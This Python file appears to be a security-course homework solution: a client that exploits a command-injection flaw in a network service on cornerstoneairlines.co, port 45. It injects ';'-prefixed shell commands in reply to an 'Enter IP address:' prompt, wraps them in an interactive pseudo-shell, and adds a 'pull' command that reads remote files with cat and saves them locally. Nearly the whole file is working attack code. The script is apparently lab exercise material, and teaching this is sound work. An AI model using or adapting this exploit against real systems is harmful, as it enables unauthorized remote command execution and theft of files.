"""
    Use the same techniques such as (but not limited to):
        1) Sockets
        2) File I/O
        3) raw_input()

    from the OSINT HW to complete this assignment. Good luck!
"""
import time
import socket
import sys

host = "cornerstoneairlines.co" # IP address here
port = 45 # Port here

def execute_cmd(cmd):
    help_menu = '''----------HELP MENU----------\n 1. shell --> Drop into an interactive shell and allow users to gracefully exit\n 2. pull <remote-path> <local-path> --> Download files\n 3. help --> shows this help menu\n 4. quit --> Quit the shell\n'''
    pwd = "/"

    split_cmd = cmd.split(" ")
    cmd = split_cmd[0]
    if cmd == "shell":
        inputt = input(pwd + "> ")

        while inputt != "exit":
            # return to last working directory
            last_pwd = "; cd " + pwd + " && " 
            data = ""

            split_in = inputt.split(" ")
            if "cd " in inputt:
                # check to see if file exists before you cd
                if split_in[1] == "/" or split_in[1] is None:
                    pwd = "/"
                    send_cmd("; cd / \n")
                else:
                    out = "; cd / && if [ -d $" + split_in[1] + " ]; then echo t; else echo f; fi\n"
                    if send_cmd(out) == 'f':                                    
                        data = "directory does not exist"                       
                    else:                                                       
                        out = last_pwd + inputt + " && echo $PWD\n"             
                        pwd = send_cmd(out)     
            else:
                out = last_pwd + inputt + '\n'
                data = send_cmd(out)

            print(data) # cmd output
            inputt = input(pwd + "> ")
    if cmd == "pull":
        data = send_cmd(";cat " + split_cmd[1] + '\n')
        f = open(split_cmd[2], "w+")
        f.write(data)
        f.close()
    if cmd == "help":
        print(help_menu)
    else:
        if inputt != "exit":
            print("Invalid input. Use the help menu to see valid inputs.\n")

def send_cmd(cmd):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host,port))
    data = b''

    # receive all banner info first
    while "Enter IP address:" not in data.decode('ascii'):
        data += s.recv(1024)

    s.send(cmd.encode('utf-8'))
    data = s.recv(1024) # cmd output
    return data.decode('ascii').strip()

if __name__ == '__main__':
    while True:
        inp = input("$ ")
        if inp == "quit":
            break;
        else:
            execute_cmd(inp)
